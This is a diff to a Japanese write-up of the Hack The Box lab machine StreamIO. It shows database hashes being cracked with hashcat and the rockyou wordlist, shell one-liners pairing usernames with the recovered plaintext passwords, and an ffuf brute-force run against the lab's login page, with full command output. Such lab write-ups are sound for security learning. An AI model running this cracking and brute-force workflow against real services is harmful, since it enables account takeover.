@@ -56,6 +56,7 @@ hosts編集
 ```
 443番アクセス  
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_01.png">  
+ログインページを確認  
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_02.png">  
 列挙  
 すべて403だが、adminのみレスポンスサイズが小さいね
@@ -283,11 +284,10 @@ usersテーブルの列名を確認
                 <h5 class="p-2">William                                           d62be0dc82071bccc1322d64ec5b6c51                  </h5>
                 <h5 class="p-2">yoshihide                                         b779ba15cedfd22a023c4d8bcf5f2332                  </h5>
 ```
-パスワードの形式を確認、どうやらmd5っぽい
+パスワードの形式を確認、おそらくmd5っぽい可能性が高い
 ```sh
 └─$ echo '665a50ac9eaa781e4f7f04199db97a11' > test.txt                            
-                                                                                                                                                                       
-┌──(kali㉿kali)-[~]
+
 └─$ name-that-hash -f test.txt --no-banner 
 
 665a50ac9eaa781e4f7f04199db97a11
@@ -304,11 +304,13 @@ md5(md5(md5($pass))), HC: 3500 Summary: Hashcat mode is only supported in hashca
 md5(utf16($pass)), JtR: dynamic_29 md4(utf16($pass)), JtR: dynamic_33 md5(md4($pass)), JtR: dynamic_34 Haval-128, JtR: haval-128-4 RIPEMD-128, JtR: ripemd-128 MD2, 
 JtR: md2 Snefru-128, JtR: snefru-128 DNSSEC(NSEC3), HC: 8300  RAdmin v2.x, HC: 9900 JtR: radmin Cisco Type 7,  BigCrypt, JtR: bigcrypt
 ```
-クラックできた
+md5ハッシュのなかでクラックできたパスワードを複数確認
 ```sh
 └─$ cat credentials.txt | awk '{print $3}' > passwords.txt
 
-└─$ hashcat -a 0 -m 0 passwords.txt /usr/share/wordlists/rockyou.txt --quiet 
+└─$ hashcat -a 0 -m 0 passwords.txt /usr/share/wordlists/rockyou.txt --quiet > cracked.txt
+
+└─$ cat cracked.txt
 3577c47eb1e12c8ba021611e1280753c:highschoolmusical
 ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
 665a50ac9eaa781e4f7f04199db97a11:paddpadd
@@ -321,4 +323,85 @@ ef8f3d30a856cf166fb8215aca93e9ff:%$clara
 b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
 b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
 f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
+```
+有効なクレデンシャルを再度まとめる
+```sh
+└─$ cat cracked.txt | awk -F ':' '{print $1}' > cracked_hashes.txt
+
+└─$ grep -Ff cracked_hashes.txt credentials.txt | sed 's/<h5 class="p-2">//g' | awk '{print $1 ":"$2}' > temp.txt
+
+└─$ awk -F: 'NR==FNR{a[$1]=$2;next}{print $1,a[$2]}' OFS=: cracked.txt temp.txt > vaild.txt
+
+└─$ cat vaild.txt 
+admin:paddpadd
+Barry:$hadoW
+Bruno:$monique$1991$
+Clara:%$clara
+Juliette:$3xybitch
+Lauren:##123a8j8w5123##
+Lenord:physics69i
+Michelle:!?Love?!123
+Sabrina:!!sabrina$
+Thane:highschoolmusical
+Victoria:!5psycho8!
+yoshihide:66boysandgirls..
+```
+とういうことでブルートフォース攻撃
+```sh
+└─$ curl -d "username=admin&password=admin" -k -s https://streamio.htb/login.php | grep 'Login failed'
+        <div class="alert alert-danger">Login failed</div>
+
+└─$ cat vaild.txt | awk -F ':' {'print $1'} > users.txt
+
+└─$ cat vaild.txt | awk -F ':' {'print $2'} > pass.txt
+```
+ffufでブルートフォース攻撃
+```sh
+└─$ ffuf -request request -w users.txt:userFUZZ -w pass.txt:passFUZZ -fr 'Login failed'
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : https://streamio.htb/login.php
+ :: Wordlist         : userFUZZ: /home/kali/users.txt
+ :: Wordlist         : passFUZZ: /home/kali/pass.txt
+ :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+ :: Header           : Sec-Fetch-Mode: navigate
+ :: Header           : Accept-Language: en-US,en;q=0.5
+ :: Header           : Referer: https://streamio.htb/login.php
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Header           : Upgrade-Insecure-Requests: 1
+ :: Header           : Sec-Fetch-Dest: document
+ :: Header           : Sec-Fetch-Site: same-origin
+ :: Header           : Host: streamio.htb
+ :: Header           : Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip
+ :: Header           : Origin: https://streamio.htb
+ :: Header           : Te: trailers
+ :: Header           : Connection: keep-alive
+ :: Header           : Sec-Fetch-User: ?1
+ :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+ :: Header           : Accept-Encoding: gzip, deflate, br
+ :: Header           : Priority: u=0, i
+ :: Data             : username=userFUZZ&password=passFUZZ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Regexp: Login failed
+________________________________________________
+
+[Status: 302, Size: 4147, Words: 796, Lines: 111, Duration: 780ms]
+    * passFUZZ: 66boysandgirls..
+    * userFUZZ: yoshihide
+
+:: Progress: [144/144] :: Job [1/1] :: 36 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
 ```
